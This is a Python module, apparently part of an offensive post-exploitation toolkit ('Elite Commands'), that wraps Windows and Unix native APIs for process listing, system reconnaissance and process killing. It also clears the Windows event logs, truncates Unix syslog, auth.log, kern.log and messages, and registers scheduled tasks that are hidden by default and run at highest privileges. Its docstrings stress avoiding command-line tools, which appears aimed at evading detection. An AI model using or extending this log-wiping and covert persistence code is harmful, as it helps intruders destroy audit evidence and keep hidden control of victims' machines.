#!/usr/bin/env python3
"""
Native API Wrappers for Elite Commands
NO subprocess calls - direct API access only
"""

import ctypes
from ctypes import wintypes
import sys
import os
from typing import List, Dict, Any, Optional

class WindowsAPI:
    """Windows API wrappers using ctypes"""
    
    def __init__(self):
        if sys.platform != 'win32':
            raise OSError("WindowsAPI only available on Windows")
        
        self.kernel32 = ctypes.windll.kernel32
        self.advapi32 = ctypes.windll.advapi32
        self.user32 = ctypes.windll.user32
        self.psapi = ctypes.windll.psapi
        self.ntdll = ctypes.windll.ntdll
    
    def list_processes(self) -> List[Dict[str, Any]]:
        """List processes using Windows API (NOT tasklist)"""
        processes = []
        
        # Use CreateToolhelp32Snapshot instead of subprocess
        TH32CS_SNAPPROCESS = 0x00000002
        
        class PROCESSENTRY32(ctypes.Structure):
            _fields_ = [
                ("dwSize", wintypes.DWORD),
                ("cntUsage", wintypes.DWORD),
                ("th32ProcessID", wintypes.DWORD),
                ("th32DefaultHeapID", ctypes.POINTER(wintypes.ULONG)),
                ("th32ModuleID", wintypes.DWORD),
                ("cntThreads", wintypes.DWORD),
                ("th32ParentProcessID", wintypes.DWORD),
                ("pcPriClassBase", wintypes.LONG),
                ("dwFlags", wintypes.DWORD),
                ("szExeFile", wintypes.CHAR * 260)
            ]
        
        snapshot = self.kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if snapshot == -1:
            return []
        
        try:
            pe32 = PROCESSENTRY32()
            pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
            
            if self.kernel32.Process32First(snapshot, ctypes.byref(pe32)):
                while True:
                    processes.append({
                        'pid': pe32.th32ProcessID,
                        'name': pe32.szExeFile.decode('utf-8', errors='ignore'),
                        'parent_pid': pe32.th32ParentProcessID,
                        'threads': pe32.cntThreads
                    })
                    
                    if not self.kernel32.Process32Next(snapshot, ctypes.byref(pe32)):
                        break
        finally:
            self.kernel32.CloseHandle(snapshot)
        
        return processes
    
    def query_service_status(self, service_name: str) -> Dict[str, Any]:
        """Query service status using SC Manager API (NOT sc.exe)"""
        
        # Open service control manager
        SC_MANAGER_ENUMERATE_SERVICE = 0x0004
        scm_handle = self.advapi32.OpenSCManagerW(None, None, SC_MANAGER_ENUMERATE_SERVICE)
        
        if not scm_handle:
            return {'error': 'Failed to open SC Manager'}
        
        try:
            # Open service
            SERVICE_QUERY_STATUS = 0x0004
            service_handle = self.advapi32.OpenServiceW(
                scm_handle, service_name, SERVICE_QUERY_STATUS
            )
            
            if not service_handle:
                return {'error': f'Service {service_name} not found'}
            
            try:
                # Query service status
                class SERVICE_STATUS(ctypes.Structure):
                    _fields_ = [
                        ("dwServiceType", wintypes.DWORD),
                        ("dwCurrentState", wintypes.DWORD),
                        ("dwControlsAccepted", wintypes.DWORD),
                        ("dwWin32ExitCode", wintypes.DWORD),
                        ("dwServiceSpecificExitCode", wintypes.DWORD),
                        ("dwCheckPoint", wintypes.DWORD),
                        ("dwWaitHint", wintypes.DWORD)
                    ]
                
                status = SERVICE_STATUS()
                if self.advapi32.QueryServiceStatus(service_handle, ctypes.byref(status)):
                    state_map = {
                        1: 'STOPPED',
                        2: 'START_PENDING',
                        3: 'STOP_PENDING',
                        4: 'RUNNING',
                        5: 'CONTINUE_PENDING',
                        6: 'PAUSE_PENDING',
                        7: 'PAUSED'
                    }
                    
                    return {
                        'service': service_name,
                        'state': state_map.get(status.dwCurrentState, 'UNKNOWN'),
                        'state_code': status.dwCurrentState
                    }
                else:
                    return {'error': 'Failed to query service status'}
            finally:
                self.advapi32.CloseServiceHandle(service_handle)
        finally:
            self.advapi32.CloseServiceHandle(scm_handle)
    
    def clear_event_log(self, log_name: str) -> bool:
        """Clear event log using API (NOT wevtutil.exe)"""
        
        # Open event log
        h_log = self.advapi32.OpenEventLogW(None, log_name)
        if not h_log:
            return False
        
        try:
            # Clear the log
            success = self.advapi32.ClearEventLogW(h_log, None)
            return success != 0
        finally:
            self.advapi32.CloseEventLog(h_log)
    
    def create_scheduled_task_api(self, task_config: Dict[str, Any]) -> bool:
        """Create scheduled task using COM APIs (NOT schtasks.exe)"""
        
        try:
            import win32com.client
            
            # Create task scheduler object
            scheduler = win32com.client.Dispatch('Schedule.Service')
            scheduler.Connect()
            
            # Get root folder
            root_folder = scheduler.GetFolder('\\')
            
            # Create task definition
            task_def = scheduler.NewTask(0)
            
            # Set registration info
            reg_info = task_def.RegistrationInfo
            reg_info.Description = task_config.get('description', '')
            reg_info.Author = task_config.get('author', 'System')
            
            # Set principal (run with highest privileges)
            principal = task_def.Principal
            principal.LogonType = 3  # Interactive token
            principal.RunLevel = 1   # Highest privileges
            
            # Set settings
            settings = task_def.Settings
            settings.Enabled = True
            settings.Hidden = task_config.get('hidden', True)
            settings.StartWhenAvailable = True
            
            # Create trigger
            triggers = task_def.Triggers
            trigger = triggers.Create(1)  # Time trigger
            trigger.StartBoundary = task_config.get('start_time')
            trigger.Enabled = True
            
            # Create action
            actions = task_def.Actions
            action = actions.Create(0)  # Exec action
            action.Path = task_config['executable']
            action.Arguments = task_config.get('arguments', '')
            
            # Register task
            root_folder.RegisterTaskDefinition(
                task_config['name'],
                task_def,
                6,  # TASK_CREATE_OR_UPDATE
                '',  # User (None = current)
                '',  # Password (None)
                3,  # TASK_LOGON_INTERACTIVE_TOKEN
                ''   # SDDL (None)
            )
            
            return True
            
        except Exception:
            return False
    
    def kill_process(self, pid: int) -> bool:
        """Kill process using Windows API (NOT taskkill)"""
        
        PROCESS_TERMINATE = 0x0001
        
        # Open process
        h_process = self.kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
        if not h_process:
            return False
        
        try:
            # Terminate process
            success = self.kernel32.TerminateProcess(h_process, 0)
            return success != 0
        finally:
            self.kernel32.CloseHandle(h_process)
    
    def get_system_info(self) -> Dict[str, Any]:
        """Get system info using Windows APIs (NOT systeminfo.exe)"""
        
        info = {}
        
        # Get computer name
        buffer = ctypes.create_unicode_buffer(256)
        size = wintypes.DWORD(256)
        if self.kernel32.GetComputerNameW(buffer, ctypes.byref(size)):
            info['computer_name'] = buffer.value
        
        # Get Windows version
        class OSVERSIONINFOEXW(ctypes.Structure):
            _fields_ = [
                ("dwOSVersionInfoSize", wintypes.DWORD),
                ("dwMajorVersion", wintypes.DWORD),
                ("dwMinorVersion", wintypes.DWORD),
                ("dwBuildNumber", wintypes.DWORD),
                ("dwPlatformId", wintypes.DWORD),
                ("szCSDVersion", wintypes.WCHAR * 128),
                ("wServicePackMajor", wintypes.WORD),
                ("wServicePackMinor", wintypes.WORD),
                ("wSuiteMask", wintypes.WORD),
                ("wProductType", wintypes.BYTE),
                ("wReserved", wintypes.BYTE)
            ]
        
        os_version = OSVERSIONINFOEXW()
        os_version.dwOSVersionInfoSize = ctypes.sizeof(OSVERSIONINFOEXW)
        
        # Use RtlGetVersion instead of GetVersionEx (more reliable)
        self.ntdll.RtlGetVersion(ctypes.byref(os_version))
        
        info['windows_version'] = {
            'major': os_version.dwMajorVersion,
            'minor': os_version.dwMinorVersion,
            'build': os_version.dwBuildNumber,
            'service_pack': os_version.szCSDVersion
        }
        
        # Get system memory
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", wintypes.DWORD),
                ("dwMemoryLoad", wintypes.DWORD),
                ("ullTotalPhys", ctypes.c_uint64),
                ("ullAvailPhys", ctypes.c_uint64),
                ("ullTotalPageFile", ctypes.c_uint64),
                ("ullAvailPageFile", ctypes.c_uint64),
                ("ullTotalVirtual", ctypes.c_uint64),
                ("ullAvailVirtual", ctypes.c_uint64),
                ("ullAvailExtendedVirtual", ctypes.c_uint64)
            ]
        
        mem_status = MEMORYSTATUSEX()
        mem_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        
        if self.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem_status)):
            info['memory'] = {
                'total_physical': mem_status.ullTotalPhys,
                'available_physical': mem_status.ullAvailPhys,
                'memory_load': mem_status.dwMemoryLoad
            }
        
        return info


class UnixAPI:
    """Unix/Linux API wrappers using system calls"""
    
    def __init__(self):
        if sys.platform == 'win32':
            raise OSError("UnixAPI not available on Windows")
    
    def list_processes(self) -> List[Dict[str, Any]]:
        """List processes using /proc filesystem (NOT ps)"""
        processes = []
        
        try:
            # Read from /proc directory
            for pid_dir in os.listdir('/proc'):
                if pid_dir.isdigit():
                    try:
                        pid = int(pid_dir)
                        
                        # Read process name from cmdline
                        with open(f'/proc/{pid}/cmdline', 'rb') as f:
                            cmdline = f.read().replace(b'\0', b' ').decode('utf-8', errors='ignore').strip()
                        
                        # Read process status
                        with open(f'/proc/{pid}/stat', 'r') as f:
                            stat_line = f.read()
                            # Extract process name (in parentheses)
                            start = stat_line.find('(')
                            end = stat_line.rfind(')')
                            if start != -1 and end != -1:
                                name = stat_line[start+1:end]
                            else:
                                name = 'unknown'
                        
                        processes.append({
                            'pid': pid,
                            'name': name,
                            'cmdline': cmdline or name
                        })
                    except (IOError, OSError):
                        continue
        except OSError:
            pass
        
        return processes
    
    def kill_process(self, pid: int) -> bool:
        """Kill process using system call (NOT kill command)"""
        try:
            os.kill(pid, 9)  # SIGKILL
            return True
        except OSError:
            return False
    
    def get_system_info(self) -> Dict[str, Any]:
        """Get system info using /proc and system calls (NOT uname)"""
        info = {}
        
        # Get hostname
        try:
            import socket
            info['hostname'] = socket.gethostname()
        except:
            pass
        
        # Get kernel version
        try:
            with open('/proc/version', 'r') as f:
                info['kernel_version'] = f.read().strip()
        except:
            pass
        
        # Get memory info
        try:
            with open('/proc/meminfo', 'r') as f:
                for line in f:
                    if line.startswith('MemTotal:'):
                        info['total_memory'] = int(line.split()[1]) * 1024
                    elif line.startswith('MemAvailable:'):
                        info['available_memory'] = int(line.split()[1]) * 1024
        except:
            pass
        
        # Get CPU info
        try:
            with open('/proc/cpuinfo', 'r') as f:
                cpu_count = 0
                for line in f:
                    if line.startswith('processor'):
                        cpu_count += 1
                info['cpu_count'] = cpu_count
        except:
            pass
        
        return info
    
    def clear_logs(self) -> bool:
        """Clear system logs (requires root)"""
        log_files = [
            '/var/log/syslog',
            '/var/log/auth.log',
            '/var/log/kern.log',
            '/var/log/messages'
        ]
        
        success_count = 0
        for log_file in log_files:
            try:
                # Truncate log file
                with open(log_file, 'w'):
                    pass
                success_count += 1
            except (IOError, OSError):
                continue
        
        return success_count > 0


# Unified API interface
def get_native_api():
    """Get appropriate API wrapper for current platform"""
    if sys.platform == 'win32':
        return WindowsAPI()
    else:
        return UnixAPI()


# Convenience functions that work cross-platform
def list_processes_native() -> List[Dict[str, Any]]:
    """List processes using native APIs"""
    api = get_native_api()
    return api.list_processes()


def kill_process_native(pid: int) -> bool:
    """Kill process using native APIs"""
    api = get_native_api()
    return api.kill_process(pid)


def get_system_info_native() -> Dict[str, Any]:
    """Get system info using native APIs"""
    api = get_native_api()
    return api.get_system_info()